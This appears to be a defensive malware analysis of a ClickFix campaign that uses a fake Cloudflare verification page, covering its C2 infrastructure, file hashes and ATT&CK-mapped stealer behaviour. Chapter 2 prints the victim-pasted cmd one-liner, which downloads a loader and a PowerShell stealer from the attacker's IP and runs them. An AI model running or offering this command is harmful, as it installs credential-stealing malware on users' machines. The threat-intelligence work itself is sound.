# Fake Cloudflare ClickFix: When "Verify You Are Human" Tells You to Open CMD

> **Analyst Note:** This is a static and behavioral reverse-engineering analysis of a live ClickFix malware campaign encountered in the wild. All payloads were analyzed safely without execution.

---

## Table of Contents
- [Chapter 1: Infrastructure & Reconnaissance](#chapter-1-infrastructure--reconnaissance)
- [Chapter 2: Payload Architecture & File Analysis](#chapter-2-payload-architecture--file-analysis)
- [Chapter 3: Correlation & Threat Intelligence](#chapter-3-correlation--threat-intelligence)
- [Chapter 4: Sandbox Behaviour & MITRE ATT&CK Mapping](#chapter-4-sandbox-behaviour--mitre-attack-mapping)
- [Mitigation & Defense](#mitigation--defense)

---

## Chapter 1: Infrastructure & Reconnaissance

### Overview
The attack vector utilizes a fake Cloudflare verification page leveraging the **ClickFix** social engineering technique. Instead of a standard file download, victims are tricked into opening the Windows `CMD` or `Run` dialog and pasting a heavily obfuscated command.

- **Initial Redirection:** User attempted to download a file and was auto-redirected to a fake verification template.
- **C2 Server IP:** `185.138.88.151`
- **Location:** Amsterdam, Netherlands
- **Hosting Provider / ASN:** `ASN 215540` — `GCS-AS GLOBAL CONNECTIVITY SOLUTIONS LLP`
- **Infrastructure Pattern:** The attacker uses budget European VPS providers known for lenient abuse policies to host transient loader scripts (`/438`) and payloads (`/439`).

---

## Chapter 2: Payload Architecture & File Analysis

Stage 1: The Loader (trungle.txt)
Path: hxxp://185.138.88.151/438
File Size: 50 bytes (extremely compact, single-line instruction set).
SHA-256 Hash: eaf7114a2f6c6c9cc629164a9c4ffcc8eeffe0f03bcd61c54e5c11cd60076b5
Characteristics: Acts strictly as a trigger/loader script to fetch the secondary payload. Undetected by traditional antivirus signatures (0/57) due to its tiny footprint and lack of native malicious file signatures.

When the payload clipboard is executed, it invokes a multi-stage downloader pattern:

```cmd
set "__VSCMD_WIN_64BIT=true" && cd %tmp% & curl.exe -sLo %tmp%\trungle.txt 3112851607/438 && curl.exe -sLo %tmp%\Z595.ps1 3112851607/439 && for /f "delims=" %i in (trungle.txt) do %i


## Stage 2: The Stealer (Z595.ps1)
Path: hxxp://185.138.88.151/439
File Size: 471.37 KB (482,682 bytes)
SHA-256 Hash: 566a2e0f5104c7f6a7ffe7f1b896acb0013f00fee4115201436174ff71198a21
MD5 Hash: b40149ab606f2f4b825c291bcae0b187
File Magic: ASCII text with very long lines (65536u), with no line terminators.
Analysis: This massive size disparity (50 bytes vs 471 KB) confirms a decoupled multi-stage delivery architecture. The script is heavily obfuscated into a single continuous string to evade static analysis and bypass automated endpoint detection.


## Chapter 3: Correlation & Threat Intelligence
VirusTotal relations data correlates the core C2 infrastructure directly to active malware families:
Communicating Files: 14+ distinct active samples interact with 185.138.88.151, predominantly composed of obfuscated PowerShell stealers (Z595.ps1) and secondary dropped executables (q6ytyo0.exe).
Freshness & TTL: First submitted to VirusTotal on November 7, 2026, confirming this is an active, freshly spun-up campaign.
AV Evasion: Standard static scans yield very low initial detection ratios (1/61 to 0/61), relying entirely on behavioral heuristic monitoring for identification.

## Chapter 4: Sandbox Behaviour & MITRE ATT&CK Mapping

When executed in a controlled sandbox environment, `Z595.ps1` triggers aggressive adversary behaviors mapped under the **MITRE ATT&CK** framework:

| Tactics | Technique ID | Behavioral Details |
| :--- | :--- | :--- |
| **Execution** | T1059.001 / T1064 | Leverages native PowerShell interpreters to run encoded/obfuscated command sequences. |
| **Privilege Escalation** | T1055 | Performs **Process Injection** into legitimate running system processes to elevate operational context. |
| **Defense Evasion** | T1027 | Heavy **Obfuscation** of script contents into single-line strings to foil static code review and standard AV signatures. |
| **Discovery** | T1033 / T1069 | System owner, user discovery, and permission group enumeration prior to harvesting sensitive user tokens. |
| **Dropped Artifacts** | *Multiple* | Drops 11 secondary helper items during execution, including 1 PE_DLL and native COFF components for memory-only execution. |

### Additional Behavioral Metrics:
- **Sigma Signatures:** Triggered multiple medium/high behavioral rules indicating unauthorized script execution loops and environment inspection.
- **Network Telemetry:** Verified single upstream HTTP communication stream looping directly back to the infrastructure IP (`185.138.88.151`).

